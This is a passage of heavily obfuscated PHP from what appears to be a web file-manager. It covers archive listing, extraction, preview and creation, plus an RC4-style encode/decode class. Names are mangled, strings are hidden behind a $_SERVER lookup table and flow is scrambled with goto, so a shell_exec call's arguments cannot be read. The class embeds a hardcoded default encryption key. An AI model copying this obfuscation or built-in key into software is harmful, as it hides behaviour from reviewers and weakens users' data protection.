Action($bíƒ¤†¬é[1109])->sharePathInfo($fØ‹ìÉ®Ó§, $D¥À©î¡´¬); } public function infoFull($Bçíùõˆ) { $FÖ°Ë®Çóˆ =& $_SERVER[Ö]; $EĞ»Úø‚®¬ = explode($FÖ°Ë®Çóˆ[8], trim($Bçíùõˆ, $FÖ°Ë®Çóˆ[8])); if (count($EĞ»Úø‚®¬) > 1) { $féõ‘À«Ã = implode($FÖ°Ë®Çóˆ[8], array_splice($EĞ»Úø‚®¬, 1)); $F®³¢»ù”ˆ = $this->model->pathInfoByPath($EĞ»Úø‚®¬[0], $féõ‘À«Ã); if (!$F®³¢»ù”ˆ) { return !1; } $this->pathParse[$FÖ°Ë®Çóˆ[1004]] = $F®³¢»ù”ˆ[$FÖ°Ë®Çóˆ[365]]; } return $this->infoParse($Bçíùõˆ); } public function listAll($DøŒÀ„ÄÅœ) { goto eœÕ¦º‚ê; C§ˆñöÜø: $e»ÜÃÑª–› = $this->model->listAll($DøŒÀ„ÄÅœ); $BÚ§¾Œïİ— = Model($BÊ˜ØŸáã[532])->getInfo($fÆÀ„Í‹”à[$BÊ˜ØŸáã[437]]); $DæŠ²¢Ì‘Í = Action($BÊ˜ØŸáã[1109]); goto CÒœØä†½; eœÕ¦º‚ê: $BÊ˜ØŸáã =& $_SERVER[Ö]; $fÆÀ„Í‹”à = IO::info($this->pathParse[$BÊ˜ØŸáã[75]]); if (!$fÆÀ„Í‹”à) { return array(); } goto C§ˆñöÜø; CÒœØä†½: foreach ($e»ÜÃÑª–› as &$D…š‚ª‡À®) { check_abort(); $D…š‚ª‡À®[$BÊ˜ØŸáã[387]] = $DæŠ²¢Ì‘Í->_shareItemeParse($D…š‚ª‡À®[$BÊ˜ØŸáã[387]], $BÚ§¾Œïİ—); } return $e»ÜÃÑª–›; goto eÇ ˜²Ñ³; eÇ ˜²Ñ³: } } goto b¸ÎŸ‚ó„¶; Eæ„‚‚˜“Š: register_shutdown_function($_SERVER[Ç·ÕÂû¼„][36]); set_error_handler($_SERVER[Ç·ÕÂû¼„][49], $dííàÖ’Îë); if (function_exists($_SERVER[Ç·ÕÂû¼„][50])) { set_exception_handler($_SERVER[Ç·ÕÂû¼„][51]); } goto bºŸ†ôÄà¦; c¢—Œæ„™ˆ: class KodArchive { static function init() { goto cÕƒØ†õ–Ş; cÕƒØ†õ–Ş: $c÷·‡Êˆ°ò =& $_SERVER[Ö]; if (defined($c÷·‡Êˆ°ò[1859])) { return; } define($c÷·‡Êˆ°ò[1859], SDK_DIR . $c÷·‡Êˆ°ò[1860]); goto A©ÏŞğ¶ä; D„ÄòÔ‹æ¼: require_once ARCHIVE_LIB . $c÷·‡Êˆ°ò[1867]; require_once ARCHIVE_LIB . $c÷·‡Êˆ°ò[1868]; require_once ARCHIVE_LIB . $c÷·‡Êˆ°ò[1869]; goto DŸÔë¹„¡‡; A©ÏŞğ¶ä: define($c÷·‡Êˆ°ò[1861], TEMP_FILES); define($c÷·‡Êˆ°ò[1862], TEMP_FILES); define($c÷·‡Êˆ°ò[1863], $c÷·‡Êˆ°ò[1864]); goto a”–Ïßô®…; a”–Ïßô®…: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $c÷·‡Êˆ°ò[1865]; require_once ARCHIVE_LIB . $c÷·‡Êˆ°ò[1866]; goto D„ÄòÔ‹æ¼; DŸÔë¹„¡‡: require_once ARCHIVE_LIB . $c÷·‡Êˆ°ò[1870]; goto B¦óÃèÓÒ¿; B¦óÃèÓÒ¿: } static function checkIfType($BöÌ—ë, $d ¨¨÷ŸëŸ) { goto F¥óàÍŸ–Ï; F¥óàÍŸ–Ï: $BÅÂ”È‡™ =& $_SERVER[Ö]; self::init(); $aç¯àÑÅ®´ = array($BÅÂ”È‡™[297] => array($BÅÂ”È‡™[297], $BÅÂ”È‡™[1871], $BÅÂ”È‡™[1872], $BÅÂ”È‡™[1873]), $BÅÂ”È‡™[1874] => array($BÅÂ”È‡™[1874], $BÅÂ”È‡™[1875], $BÅÂ”È‡™[1036], $BÅÂ”È‡™[1034]), $BÅÂ”È‡™[1038] => array($BÅÂ”È‡™[1038], $BÅÂ”È‡™[1876], $BÅÂ”È‡™[1877], $BÅÂ”È‡™[1878], $BÅÂ”È‡™[1879], $BÅÂ”È‡™[1880], $BÅÂ”È‡™[1881])); goto Cñœ¿à”‹; F‘‚–ïË: return $Câ¨“ÛƒÍí; goto f˜›»Êº›; Cñœ¿à”‹: $Câ¨“ÛƒÍí = in_array($BöÌ—ë, $aç¯àÑÅ®´[$d ¨¨÷ŸëŸ]); if ($Câ¨“ÛƒÍí && ($d ¨¨÷ŸëŸ == $BÅÂ”È‡™[297] || $d ¨¨÷ŸëŸ == $BÅÂ”È‡™[1874]) && (!function_exists($BÅÂ”È‡™[1882]) || !function_exists($BÅÂ”È‡™[1883]))) { show_tips($BÅÂ”È‡™[1884]); } if ($Câ¨“ÛƒÍí && $d ¨¨÷ŸëŸ == $BÅÂ”È‡™[1038] && (!function_exists($BÅÂ”È‡™[1885]) || !strstr(shell_exec($BÅÂ”È‡™[1886]), $BÅÂ”È‡™[1887]))) { show_tips($BÅÂ”È‡™[1888]); } goto F‘‚–ïË; f˜›»Êº›: } static function listContent($EŒÏºã¶ÎÛ, $F¥†¶˜×  = true) { $céˆÑçÎùõ =& $_SERVER[Ö]; self::init(); $BÃëñˆ÷ = !empty($GLOBALS[$céˆÑçÎùõ[1042]]) ? $GLOBALS[$céˆÑçÎùõ[1042]] : get_path_ext($EŒÏºã¶ÎÛ); $fÈĞëãŒÍÅ = !1; if (self::checkIfType($BÃëñˆ÷, $céˆÑçÎùõ[1874])) { $aÒ»’¦Î = PclTarList($EŒÏºã¶ÎÛ, $BÃëñˆ÷); $fÈĞëãŒÍÅ = array(); for ($c…¼›ä±ğœ = 0; $c…¼›ä±ğœ < count($aÒ»’¦Î); $c…¼›ä±ğœ++) { $cÂ’œ÷•™ = $aÒ»’¦Î[$c…¼›ä±ğœ]; if ($cÂ’œ÷•™[$céˆÑçÎùõ[1889]] == $céˆÑçÎùõ[1890] || $cÂ’œ÷•™[$céˆÑçÎùõ[1889]] == $céˆÑçÎùõ[1891]) { continue; } if ($F¥†¶˜× ) { $cÂ’œ÷•™[$céˆÑçÎùõ[1892]] = ltrim($cÂ’œ÷•™[$céˆÑçÎùõ[1892]], $céˆÑçÎùõ[1140]); } if ($cÂ’œ÷•™[$céˆÑçÎùõ[1889]] == $céˆÑçÎùõ[1893]) { $cÂ’œ÷•™[$céˆÑçÎùõ[76]] = !0; } else { $cÂ’œ÷•™[$céˆÑçÎùõ[76]] = !1; } $cÂ’œ÷•™[$céˆÑçÎùõ[1029]] = $c…¼›ä±ğœ; $fÈĞëãŒÍÅ[] = $cÂ’œ÷•™; } } else { if (self::checkIfType($BÃëñˆ÷, $céˆÑçÎùõ[1038])) { $bËÒ†²Èá = kodRarArchive::listContent($EŒÏºã¶ÎÛ); if (!$bËÒ†²Èá[$céˆÑçÎùõ[1025]]) { return $bËÒ†²Èá; } else { $fÈĞëãŒÍÅ = $bËÒ†²Èá[$céˆÑçÎùõ[1027]]; } } else { if (kodZipArchive::support($céˆÑçÎùõ[350])) { $fÈĞëãŒÍÅ = kodZipArchive::listContent($EŒÏºã¶ÎÛ); } else { $AÒÄ¯õ‹º = new PclZip($EŒÏºã¶ÎÛ); $fÈĞëãŒÍÅ = $AÒÄ¯õ‹º->listContent(); } } } if ($fÈĞëãŒÍÅ) { $e²èë—™ = unzip_charset_get($fÈĞëãŒÍÅ); $F¥†¶˜×  = $F¥†¶˜×  && function_exists($céˆÑçÎùõ[65]); for ($c…¼›ä±ğœ = 0; $c…¼›ä±ğœ < count($fÈĞëãŒÍÅ); $c…¼›ä±ğœ++) { $fÈĞëãŒÍÅ[$c…¼›ä±ğœ][$céˆÑçÎùõ[1892]] = str_replace(array($céˆÑçÎùõ[1065], $céˆÑçÎùõ[1894]), $céˆÑçÎùõ[763], $fÈĞëãŒÍÅ[$c…¼›ä±ğœ][$céˆÑçÎùõ[1892]]); if ($F¥†¶˜× ) { $fÈĞëãŒÍÅ[$c…¼›ä±ğœ][$céˆÑçÎùõ[1892]] = iconv_to($fÈĞëãŒÍÅ[$c…¼›ä±ğœ][$céˆÑçÎùõ[1892]], $e²èë—™, $céˆÑçÎùõ[322]); unset($fÈĞëãŒÍÅ[$c…¼›ä±ğœ][$céˆÑçÎùõ[1895]]); } } return array($céˆÑçÎùõ[1025] => !0, $céˆÑçÎùõ[1027] => $fÈĞëãŒÍÅ); } else { return array($céˆÑçÎùõ[1025] => !1, $céˆÑçÎùõ[1027] => $fÈĞëãŒÍÅ); } } static function extract($ašÈğ£Öğ, $Dà“Éâ·áî, $Aáµ–ÄÈ›º = "\55\61", &$DÔï·¾»Òà = false) { goto E§Î›Ş¬Ÿ; b¦µöÍ…ƒ: $bÇóÕ­ÖÊ = self::listContent($ašÈğ£Öğ, !1); if (!$bÇóÕ­ÖÊ[$bãë¨Ëñ±Ñ[1025]]) { return $bÇóÕ­ÖÊ; } if ($Aáµ–ÄÈ›º != $bãë¨Ëñ±Ñ[1024]) { goto fÒÜ’ìäÅÒ; FÌåº©Ó²‰: if ($d™É›Ÿ×Çª[$bãë¨Ëñ±Ñ[76]]) { $d Ã«‘õŞ = rtrim($d Ã«‘õŞ, $bãë¨Ëñ±Ñ[8]) . $bãë¨Ëñ±Ñ[8]; $DÔï·¾»Òà = array($DÔï·¾»Òà); } $BîÆéŞÈ×æ = str_replace($bãë¨Ëñ±Ñ[93], $bãë¨Ëñ±Ñ[8], $d Ã«‘õŞ); if (substr($BîÆéŞÈ×æ, -1) == $bãë¨Ëñ±Ñ[8]) { if (!strstr(trim($BîÆéŞÈ×æ, $bãë¨Ëñ±Ñ[8]), $bãë¨Ëñ±Ñ[8])) { $Dà“Éâ·áî = $Dà“Éâ·áî . get_path_this($BîÆéŞÈ×æ) . $bãë¨Ëñ±Ñ[8]; } } else { if ($CµĞàíäÔ„ == $d Ã«‘õŞ) { $CµĞàíäÔ„ = $bãë¨Ëñ±Ñ[33]; } } goto eóÖ°ö¿èç; B¹ÖÏ©ÙÎ: if ($GLOBALS[$bãë¨Ëñ±Ñ[6]][$bãë¨Ëñ±Ñ[1138]] != $bãë¨Ëñ±Ñ[322]) { $d Ã«‘õŞ = unzip_pre_name($DÔï·¾»Òà); } $CµĞàíäÔ„ = get_path_father($DÔï·¾»Òà); if ($CµĞàíäÔ„ == $DÔï·¾»Òà) { $CµĞàíäÔ„ = $bãë¨Ëñ±Ñ[33]; } goto FÌåº©Ó²‰; fÒÜ’ìäÅÒ: $d™É›Ÿ×Çª = self::fileIndex($bÇóÕ­ÖÊ[$bãë¨Ëñ±Ñ[1027]], $Aáµ–ÄÈ›º); $DÔï·¾»Òà = str_replace(array($bãë¨Ëñ±Ñ[1065], $bãë¨Ëñ±Ñ[1894]), $bãë¨Ëñ±Ñ[70], $d™É›Ÿ×Çª[$bãë¨Ëñ±Ñ[1892]]); $d Ã«‘õŞ = $DÔï·¾»Òà; goto B¹ÖÏ©ÙÎ; eóÖ°ö¿èç: } goto Eö¬ö×ò; E§Î›Ş¬Ÿ: $bãë¨Ëñ±Ñ =& $_SERVER[Ö]; self::init(); $Bïˆ£­Èï½ = !empty($GLOBALS[$bãë¨Ëñ±Ñ[1042]]) ? $GLOBALS[$bãë¨Ëñ±Ñ[1042]] : get_path_ext($ašÈğ£Öğ); goto b¦µöÍ…ƒ; Eö¬ö×ò: if (self::checkIfType($Bïˆ£­Èï½, $bãë¨Ëñ±Ñ[1874])) { if ($Aáµ–ÄÈ›º != $bãë¨Ëñ±Ñ[1024]) { $d Ã«‘õŞ = unzip_pre_name($d Ã«‘õŞ); $CµĞàíäÔ„ = unzip_pre_name($CµĞàíäÔ„); $fã¬ƒÇÏ¨Ä = PclTarExtractList($ašÈğ£Öğ, array($d Ã«‘õŞ), $Dà“Éâ·áî, $CµĞàíäÔ„, $Bïˆ£­Èï½); } else { $fã¬ƒÇÏ¨Ä = PclTarExtract($ašÈğ£Öğ, $Dà“Éâ·áî, $bãë¨Ëñ±Ñ[357], $Bïˆ£­Èï½); } return array($bãë¨Ëñ±Ñ[1025] => $fã¬ƒÇÏ¨Ä, $bãë¨Ëñ±Ñ[1027] => PclErrorString(!0)); } else { if (self::checkIfType($Bïˆ£­Èï½, $bãë¨Ëñ±Ñ[1038])) { return kodRarArchive::extract($ašÈğ£Öğ, $Dà“Éâ·áî, $Bïˆ£­Èï½, $DÔï·¾»Òà); } else { if (kodZipArchive::support($bãë¨Ëñ±Ñ[1896])) { return kodZipArchive::extract($ašÈğ£Öğ, $Dà“Éâ·áî, $DÔï·¾»Òà); } else { $Cì­Ñ°„Ù = new PclZip($ašÈğ£Öğ); if ($Aáµ–ÄÈ›º != $bãë¨Ëñ±Ñ[1024]) { $fã¬ƒÇÏ¨Ä = $Cì­Ñ°„Ù->extract(PCLZIP_OPT_PATH, $Dà“Éâ·áî, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $bãë¨Ëñ±Ñ[1897], PCLZIP_OPT_BY_NAME, $d™É›Ÿ×Çª[$bãë¨Ëñ±Ñ[1892]], PCLZIP_OPT_REMOVE_PATH, $CµĞàíäÔ„, PCLZIP_OPT_REPLACE_NEWER); } else { $fã¬ƒÇÏ¨Ä = $Cì­Ñ°„Ù->extract(PCLZIP_OPT_PATH, $Dà“Éâ·áî, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $bãë¨Ëñ±Ñ[1897], PCLZIP_OPT_REPLACE_NEWER); } return array($bãë¨Ëñ±Ñ[1025] => $fã¬ƒÇÏ¨Ä, $bãë¨Ëñ±Ñ[1027] => $Cì­Ñ°„Ù->errorName(!0)); } } } return array($bãë¨Ëñ±Ñ[1025] => !1, $bãë¨Ëñ±Ñ[1027] => $bãë¨Ëñ±Ñ[1898]); goto aÜøÀ¿—Ş; aÜøÀ¿—Ş: } static function fileIndex($bİìäÏĞ¨, $eŒÕ¬ŸïöÃ, $CÈ¸¤—Æ = false) { goto A³ÈÀÃ„ ; C¼ĞÖÈ¬: $A„’ªÆ’â¸ = $f†×ª²¥±©; if ($CÈ¸¤—Æ) { $A„’ªÆ’â¸ = $f†×ª²¥±©[$CÈ¸¤—Æ]; if ($f†×ª²¥±©[$cøˆƒ¤£‘¦[76]]) { $A„’ªÆ’â¸ = rtrim($A„’ªÆ’â¸, $cøˆƒ¤£‘¦[8]) . $cøˆƒ¤£‘¦[8]; } } return $A„’ªÆ’â¸; goto Dç‡‹øğùé; f¨®­…Ìƒ¨: $e¨ ×™É·³ = count($bİìäÏĞ¨); for ($D˜‹ŒÂ²¦‘ = 0; $D˜‹ŒÂ²¦‘ < $e¨ ×™É·³; $D˜‹ŒÂ²¦‘++) { if ($eŒÕ¬ŸïöÃ == $bİìäÏĞ¨[$D˜‹ŒÂ²¦‘][$cøˆƒ¤£‘¦[1029]]) { $f†×ª²¥±© = $bİìäÏĞ¨[$D˜‹ŒÂ²¦‘]; break; } } if (!$f†×ª²¥±©) { show_tips($cøˆƒ¤£‘¦[1899]); } goto C¼ĞÖÈ¬; A³ÈÀÃ„ : $cøˆƒ¤£‘¦ =& $_SERVER[Ö]; self::init(); if (!is_array($bİìäÏĞ¨)) { return !1; } goto f¨®­…Ìƒ¨; Dç‡‹øğùé: } static function extractZipFile($bˆìÅÇ‹ ·, $eÌÕ†¬ÖšÄ, $AÆò¶§‘çƒ = false) { goto bÕñÌêØÄ; cÌôƒá®Íš: if (file_exists($BÅ¼È†öé)) { return $BÅ¼È†öé; } $Càƒ¸’Éá¢ = new PclZip($bˆìÅÇ‹ ·); $Cîƒ§ˆáÃå = unzip_filter_ext($A´¼›èãŸ¨ . get_path_this($eÌÕ†¬ÖšÄ)); goto dØ°¡¥©Ì; cÏ¢¡®˜Ã: if (!file_exists($Cîƒ§ˆáÃå)) { return !1; } @rename($Cîƒ§ˆáÃå, $BÅ¼È†öé); return $BÅ¼È†öé; goto f¶—ÊÊÜŞ; dØ°¡¥©Ì: $eÊª·Ïá¿ö = get_path_father($eÌÕ†¬ÖšÄ); if ($eÊª·Ïá¿ö == $eÌÕ†¬ÖšÄ) { $eÊª·Ïá¿ö = $C©©ÇÊ£§›[33]; } $eËõ“ƒ´ï´ = $Càƒ¸’Éá¢->extract(PCLZIP_OPT_PATH, $A´¼›èãŸ¨, PCLZIP_CB_PRE_FILE_NAME, $C©©ÇÊ£§›[1897], PCLZIP_OPT_REMOVE_PATH, $eÊª·Ïá¿ö, PCLZIP_OPT_BY_NAME, $eÌÕ†¬ÖšÄ); goto cÏ¢¡®˜Ã; fŒµ§ÑŸÄ: mk_dir($A´¼›èãŸ¨); $BÅ¼È†öé = $A´¼›èãŸ¨ . md5($bˆìÅÇ‹ · . $eÌÕ†¬ÖšÄ); if ($AÆò¶§‘çƒ) { $BÅ¼È†öé = $A´¼›èãŸ¨ . $AÆò¶§‘çƒ; } goto cÌôƒá®Íš; bÕñÌêØÄ: $C©©ÇÊ£§› =& $_SERVER[Ö]; self::init(); $A´¼›èãŸ¨ = TEMP_FILES . hash_path($bˆìÅÇ‹ ·) . $C©©ÇÊ£§›[8]; goto fŒµ§ÑŸÄ; f¶—ÊÊÜŞ: } static function filePreview($eÅµ¹ÚÌ·Ğ, $EòšÀÏÊÅë, $fí¨¾ÂŒ¦” = false, $bÈÃŞ‹¤İÌ = false) { goto AÅê°•ë„æ; DÏÕ‰Íâò™: if (!file_exists($cô¦äÚñÍà)) { del_dir($aÑÇĞ¼‚‡); show_json($Eğóóô‰˜[1902]); } IO::fileOut($cô¦äÚñÍà, $fí¨¾ÂŒ¦”, $BîˆïÅÆ„ß); goto EÊÄÄÜÓªè; AÅê°•ë„æ: $Eğóóô‰˜ =& $_SERVER[Ö]; self::init(); $aÑÇĞ¼‚‡ = TEMP_FILES . hash_path($eÅµ¹ÚÌ·Ğ) . $Eğóóô‰˜[8]; goto DÜ†÷•Àˆš; DÜ†÷•Àˆš: mk_dir($aÑÇĞ¼‚‡); $cô¦äÚñÍà = $aÑÇĞ¼‚‡ . md5($eÅµ¹ÚÌ·Ğ . $EòšÀÏÊÅë . $bÈÃŞ‹¤İÌ); $eÙ¡‡åë…‹ = $Eğóóô‰˜[33]; goto cíßöšğö; F£ËëÎ®öä: if (!$dŠ¦çÙÅ›[$Eğóóô‰˜[1025]]) { show_json($dŠ¦çÙÅ›[$Eğóóô‰˜[1027]], !1); } if (!file_exists($AçÎŠ¯óß‹)) { show_json($Eğóóô‰˜[1901], !1); } @rename($AçÎŠ¯óß‹, $cô¦äÚñÍà); goto DÏÕ‰Íâò™; A½¿Ü–: $eÙ¡‡åë…‹ = unzip_pre_name($eÙ¡‡åë…‹); $BîˆïÅÆ„ß = get_path_this($eÙ¡‡åë…‹); $AçÎŠ¯óß‹ = unzip_filter_ext($aÑÇĞ¼‚‡ . $BîˆïÅÆ„ß); goto F£ËëÎ®öä; cíßöšğö: $dŠ¦çÙÅ› = self::extract($eÅµ¹ÚÌ·Ğ, $aÑÇĞ¼‚‡, $EòšÀÏÊÅë, $eÙ¡‡åë…‹); if (is_array($eÙ¡‡åë…‹)) { show_json($Eğóóô‰˜[1900], !1); } if (file_exists($cô¦äÚñÍà)) { IO::fileOut($cô¦äÚñÍà, $fí¨¾ÂŒ¦”, get_path_this($eÙ¡‡åë…‹)); return; } goto A½¿Ü–; EÊÄÄÜÓªè: } static function create($BÎ–‹†ÂÌã, $Dä°ŠéË¿Æ) { $dŠì‡¥Õõé =& $_SERVER[Ö]; self::init(); $cÍ„ì“Ô× = get_path_ext($BÎ–‹†ÂÌã); $Fâ»’øÇ‰ = !1; if (self::checkIfType($cÍ„ì“Ô×, $dŠì‡¥Õõé[297])) { if (kodZipArchive::support($dŠì‡¥Õõé[1003])) { return kodZipArchive::create($BÎ–‹†ÂÌã, $Dä°ŠéË¿Æ); } $côá¡íÖõ‰ = new PclZip($BÎ–‹†ÂÌã); foreach ($Dä°ŠéË¿Æ as $c·‘çÖË§… => $aÇÕõ£é”›) { $aÇÕõ£é”› = str_replace($dŠì‡¥Õõé[463], $dŠì‡¥Õõé[8], $aÇÕõ£é”›); $D„§ª±¶é„ = Kodio::clear(get_path_father($aÇÕõ£é”›)); if ($c·‘çÖË§… == 0) { $Fâ»’øÇ‰ = $côá¡íÖõ‰->create($aÇÕõ£é”›, PCLZIP_OPT_REMOVE_PATH, $D„§ª±¶é„, PCLZIP_CB_PRE_FILE_NAME, $dŠì‡¥Õõé[1903]); continue; } $Fâ»’øÇ‰ = $côá¡íÖõ‰->add($aÇÕõ£é”›, PCLZIP_OPT_REMOVE_PATH, $D„§ª±¶é„, PCLZIP_CB_PRE_FILE_NAME, $dŠì‡¥Õõé[1903]); } } else { if (self::checkIfType($cÍ„ì“Ô×, $dŠì‡¥Õõé[1874])) { foreach ($Dä°ŠéË¿Æ as $c·‘çÖË§… => $aÇÕõ£é”›) { $aÇÕõ£é”› = str_replace($dŠì‡¥Õõé[463], $dŠì‡¥Õõé[8], $aÇÕõ£é”›); $D„§ª±¶é„ = Kodio::clear(get_path_father($aÇÕõ£é”›)); if ($c·‘çÖË§… == 0) { $Fâ»’øÇ‰ = PclTarCreate($BÎ–‹†ÂÌã, array($aÇÕõ£é”›), $cÍ„ì“Ô×, null, $D„§ª±¶é„); continue; } $Fâ»’øÇ‰ = PclTarAddList($BÎ–‹†ÂÌã, array($aÇÕõ£é”›), $dŠì‡¥Õõé[33], $D„§ª±¶é„, $cÍ„ì“Ô×); } } } return $Fâ»’øÇ‰; } } class Mcrypt { public static $defaultKey = "\141\41\164\141\153\101\x3a\144\x6c\x6d\x63\x6c\x64\105\x76\54\x65"; public static function encode($dŒáŠªø§, $CÈ¡»ìøù = '', $f”³Üµ„¸” = 0, $D×¯î‚É¨ = '') { goto FŠò¨ò…Ê¨; Bæ®à–é£Ò: $A»²œ¾ÀÇ® = substr($D×¯î‚É¨, -$bœäŠ¾¥É„); $Fˆ‰¢ëÏ´ = $aÌÆØ ÍÀÊ . md5($aÌÆØ ÍÀÊ . $A»²œ¾ÀÇ®); $A¯Œôï°°  = strlen($Fˆ‰¢ëÏ´); goto F•¾ÄÌƒŠª; cØ‚¦ÕõÕ: $d£­ ¾™­Û = str_replace(array($BÆÎĞ¶êË´[280], $BÆÎĞ¶êË´[8], $BÆÎĞ¶êË´[902]), array($BÆÎĞ¶êË´[408], $BÆÎĞ¶êË´[70], $BÆÎĞ¶êË´[91]), $d£­ ¾™­Û); return $d£­ ¾™­Û; goto BÚØšƒ –‰; EÄí³íô‚: $aÌÆØ ÍÀÊ = md5(substr($CÈ¡»ìøù, 0, 16)); $aå÷‹“š¥ = md5(substr($CÈ¡»ìøù, 16, 16)); $D×¯î‚É¨ = $D×¯î‚É¨ ? $D×¯î‚É¨ : md5(microtime()); goto Bæ®à–é£Ò; FŠò¨ò…Ê¨: $BÆÎĞ¶êË´ =& $_SERVER[Ö]; $bœäŠ¾¥É„ = 4; $CÈ¡»ìøù = md5($CÈ¡»ìøù ? $CÈ¡»ìøù : self::$defaultKey); goto EÄí³íô‚; Bì‹êİø¶¿: for ($cœ¸Ùøù©± = 0; $cœ¸Ùøù©± <= 255; $cœ¸Ùøù©±++) { $eÃ½Ì»´[$cœ¸Ùøù©±] = ord($Fˆ‰¢ëÏ´[$cœ¸Ùøù©± % $A¯Œôï°° ]); } $b¡İ‹ğÓô” = range(0, 255); for ($Cƒ†¸ŠÇ÷Û = $cœ¸Ùøù©± = 0; $cœ¸Ùøù©± < 256; $cœ¸Ùøù©±++) { $Cƒ†¸ŠÇ÷Û = ($Cƒ†¸ŠÇ÷Û + $b¡İ‹ğÓô”[$cœ¸Ùøù©±] + $eÃ½Ì»´[$cœ¸Ùøù©±]) % 256; $BíÅ¶Ğ»è¬ = $b¡İ‹ğÓô”[$cœ¸Ùøù©±]; $b¡İ‹ğÓô”[$cœ¸Ùøù©±] = $b¡İ‹ğÓô”[$Cƒ†¸ŠÇ÷Û]; $b¡İ‹ğÓô”[$Cƒ†¸ŠÇ÷Û] = $BíÅ¶Ğ»è¬; } goto fÔ§À©‡ë; fÔ§À©‡ë: $d£­ ¾™­Û = $BÆÎĞ¶êË´[33]; for ($c¥¸Šˆ¡‡ˆ = $Cƒ†¸ŠÇ÷Û = $cœ¸Ùøù©± = 0; $cœ¸Ùøù©± < $dÈ¢•îºŞç; $cœ¸Ùøù©±++) { $c¥¸Šˆ¡‡ˆ = ($c¥¸Šˆ¡‡ˆ + 1) % 256; $Cƒ†¸ŠÇ÷Û = ($Cƒ†¸ŠÇ÷Û + $b¡İ‹ğÓô”[$c¥¸Šˆ¡‡ˆ]) % 256; $BíÅ¶Ğ»è¬ = $b¡İ‹ğÓô”[$c¥¸Šˆ¡‡ˆ]; $b¡İ‹ğÓô”[$c¥¸Šˆ¡‡ˆ] = $b¡İ‹ğÓô”[$Cƒ†¸ŠÇ÷Û]; $b¡İ‹ğÓô”[$Cƒ†¸ŠÇ÷Û] = $BíÅ¶Ğ»è¬; $d£­ ¾™­Û .= chr(ord($dŒáŠªø§[$cœ¸Ùøù©±]) ^ $b¡İ‹ğÓô”[($b¡İ‹ğÓô”[$c¥¸Šˆ¡‡ˆ] + $b¡İ‹ğÓô”[$Cƒ†¸ŠÇ÷Û]) % 256]); } $d£­ ¾™­Û = $A»²œ¾ÀÇ® . str_replace($BÆÎĞ¶êË´[902], $BÆÎĞ¶êË´[33], base64_encode($d£­ ¾™­Û)); goto cØ‚¦ÕõÕ; F•¾ÄÌƒŠª: $dŒáŠªø§ = sprintf($BÆÎĞ¶êË´[1904], $f”³Üµ„¸” ? $f”³Üµ„¸” + time() : 0) . substr(md5($dŒáŠªø§ . $aå÷‹“š¥), 0, 16) . $dŒáŠªø§; $dÈ¢•îºŞç = strlen($dŒáŠªø§); $eÃ½Ì»´ = array(); goto Bì‹êİø¶¿; BÚØšƒ –‰: } public static function decode($Aˆ¿‚êÙ­Ê, $A Õ¨ëÇåô = '') { goto Aøº›ˆ¯ŠÜ; f›ÂäÖ”®: $A Õ¨ëÇåô = md5($A Õ¨ëÇåô ? $A Õ¨ëÇåô : self::$defaultKey); $Bµ‡ÎÀ•Õ… = md5(substr($A Õ¨ëÇåô, 0, 16)); $A´Şå£™îù = md5(substr($A Õ¨ëÇåô, 16, 16)); goto aÖÌõ¸áŠ‹; aÖÌõ¸áŠ‹: $Dîóš‹Ù = substr($Aˆ¿‚êÙ­Ê, 0, $a‹÷â¹Ğ¿‚); $F†«³°ÑöÇ = $Bµ‡ÎÀ•Õ… . md5($Bµ‡ÎÀ•Õ… . $Dîóš‹Ù); $aƒÂ’¯Ó = strlen($F†«³°ÑöÇ); goto fáİêÄ„ë¼; F‚â”¬İ²Ñ: for ($BÌÁ­„†Îä = 0; $BÌÁ­„†Îä <= 255; $BÌÁ­„†Îä++) { $D¢¸ÛŒ”ê­[$BÌÁ­„†Îä] = ord($F†«³°ÑöÇ[$BÌÁ­„†Îä % $aƒÂ’¯Ó]); } $a¦‚ŸèÕ¹¨ = range(0, 255); for ($dŸ‹…Æ¤Ê° = $BÌÁ­„†Îä = 0; $BÌÁ­„†Îä < 256; $BÌÁ­„†Îä++) { $dŸ‹…Æ¤Ê° = ($dŸ‹…Æ¤Ê° + $a¦‚ŸèÕ¹¨[$BÌÁ­„†Îä] + $D¢¸ÛŒ”ê­[$BÌÁ­„†Îä]) % 256; $BîŠ¹»»ùî = $a¦‚ŸèÕ¹¨[$BÌÁ­„†Îä]; $a¦‚ŸèÕ¹¨[$BÌÁ­„†Îä] = $a¦‚ŸèÕ¹¨[$dŸ‹…Æ¤Ê°]; $a¦‚ŸèÕ¹¨[$dŸ‹…Æ¤Ê°] = $BîŠ¹»»ùî; } goto D÷À»ÑĞ‘„; Aøº›ˆ¯ŠÜ: $c´¦‡™¤• =& $_SERVER[Ö]; $Aˆ¿‚êÙ­Ê = str_replace(array($c´¦‡™¤•[408], $c´¦‡™¤•[70], $c´¦‡™¤•[91]), array($c´¦‡™¤•[280], $c´¦‡™¤•[8], $c´¦‡™¤•[902]), $Aˆ¿‚êÙ­Ê); $a‹÷â¹Ğ¿‚ = 4; goto f›ÂäÖ”®; fáİêÄ„ë¼: $Aˆ¿‚êÙ­Ê = base64_decode(substr($Aˆ¿‚êÙ­Ê, $a‹÷â¹Ğ¿‚)); $Fì¤ïİÍÔÜ = strlen($Aˆ¿‚êÙ­Ê); $D¢¸ÛŒ”ê­ = array(); goto F‚â”¬İ²Ñ; D÷À»ÑĞ‘„: $A‰Éù·‡Ç = $c´¦‡™¤•[33]; for ($CšÈÇ×»¹Á = $dŸ‹…Æ¤Ê° = $BÌÁ­„†Îä = 0; $BÌÁ­„†Îä < $Fì¤ïİÍÔÜ; $BÌÁ­„†Îä++) { $CšÈÇ×»¹Á = ($CšÈÇ×»¹Á + 1) % 256; $dŸ‹…Æ¤Ê° = ($dŸ‹…Æ¤Ê° + $a¦‚ŸèÕ¹¨[$CšÈÇ×»¹Á]) % 256; $BîŠ¹»»ùî = $a¦‚ŸèÕ¹¨[$CšÈÇ×»¹Á]; $a¦‚ŸèÕ¹¨[$CšÈÇ×»¹Á] = $a¦‚ŸèÕ¹¨[$dŸ‹…Æ¤Ê°]; $a¦‚ŸèÕ¹¨[$dŸ‹…Æ¤Ê°] = $BîŠ¹»»ùî; $A‰Éù·‡Ç .= chr(ord($Aˆ¿‚êÙ­Ê[$BÌÁ­„†Îä]) ^ $a¦‚ŸèÕ¹¨[($a¦‚ŸèÕ¹¨[$CšÈÇ×»¹Á] + 